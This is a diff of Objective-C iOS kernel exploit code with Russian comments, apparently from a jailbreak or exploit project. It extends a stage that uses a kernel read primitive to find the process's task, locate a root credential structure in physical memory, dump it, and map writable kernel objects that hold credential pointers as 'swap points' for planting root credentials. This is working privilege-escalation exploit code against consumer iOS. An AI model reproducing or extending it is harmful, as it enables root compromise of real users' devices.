@@ -8171,7 +8171,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                   v1 == v0 + 1 ? @"DMA-ПИШЕТСЯ ★" : @"DMA-RO/дроп"]);
                     }
                     // --- B: selfTask — ищем указатели на наш cred/label ---
+                    // 2.0.30: task_self() через сломанную цепь вернул 0 — берём
+                    // через proc_task(selfProcM), он у нас есть.
                     uint64_t stVA = task_self();
+                    if (!kpLooksLikeKernelPointer(stVA) && selfProcM) stVA = proc_task(selfProcM);
                     if (kpLooksLikeKernelPointer(stVA)) {
                         NSMutableString *th = [NSMutableString string];
                         uint32_t credPtrOff = 0xFFFFFFFF;
@@ -8191,6 +8194,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     }
                     // --- C: ROOT cred — uid=0 ucred в типе 0x18 ---
                     uint32_t rootCands = 0;
+                    uint64_t rootCredVA = 0;
                     for (uint64_t i = 0; i < wN && rootCands < 8; i++) {
                         uint64_t pa = wB + (i << 14);
                         if (kpFrameTypeOf(pa) != 0x18) continue;
@@ -8204,12 +8208,42 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             uint64_t lbAt = early_kread64(al + o + 0x78);
                             if (!kpLooksLikeKernelPointer(lbAt) && lbAt != 0) continue;
                             rootCands++;
-                            kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] ★ ROOT-cred кандидат[%u]: pa=%#llx uoff=%#x rw=%#llx label=%#llx",
-                                      rootCands, (unsigned long long)pa, o,
-                                      (unsigned long long)rwAt, (unsigned long long)lbAt]);
+                            if (!rootCredVA) {
+                                rootCredVA = al + o;
+                                kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] ★ ROOT cred VA=%#llx (pa=%#llx uoff=%#x) rw=%#llx label=%#llx — цель для свапа",
+                                          (unsigned long long)rootCredVA, (unsigned long long)pa, o,
+                                          (unsigned long long)rwAt, (unsigned long long)lbAt]);
+                                NSMutableString *rd = [NSMutableString string];
+                                for (int q = 0; q < 16; q++)
+                                    [rd appendFormat:@" +%x:%#018llx", q * 8, (unsigned long long)early_kread64(rootCredVA + (uint64_t)q * 8)];
+                                kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] ROOT cred контент:%@", rd]);
+                            }
                         }
                     }
                     kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] финиш: ROOT-кандидатов %u", rootCands]);
+                    // --- D: карта свапа — пишущиеся 0x21-объекты, держащие
+                    // указатели на наш cred / root cred. Каждый хит = точка,
+                    // куда можно втыкнуть root cred (kwrite безопасен для 0x21).
+                    if (rootCredVA && ucF) {
+                        kpNote(r, @"  [WRIMAP] охота за пишущимися указателями на cred (0x21-кадры)");
+                        uint32_t swapHits = 0;
+                        for (uint64_t i = (0x40000000ULL >> 14); i < wN && swapHits < 16; i++) {
+                            uint64_t pa = wB + (i << 14);
+                            if (kpFrameTypeOf(pa) != 0x21) continue;
+                            uint64_t al = phystokv(pa);
+                            if (!al) continue;
+                            for (uint32_t o = 0; o + 8 <= 0x4000; o += 8) {
+                                uint64_t q = early_kread64(al + o);
+                                if (q == ucF || q == rootCredVA) {
+                                    swapHits++;
+                                    kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] ★★ SWAP-точка[%u]: pa=%#llx +%#x → %s (пишется, kwrite-кандидат)",
+                                              swapHits, (unsigned long long)pa, o,
+                                              q == ucF ? "наш ucred" : "root cred"]);
+                                }
+                            }
+                        }
+                        kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] свап-точек найдено: %u", swapHits]);
+                    }
                 }
                 // 1.9.273: PAPT-override в авто-цепи не установлен (EXP-03 живёт в
                 // кнопке дампа), а сток-точка на 18.6 = stub → kpZoneVtoP падал с 0.
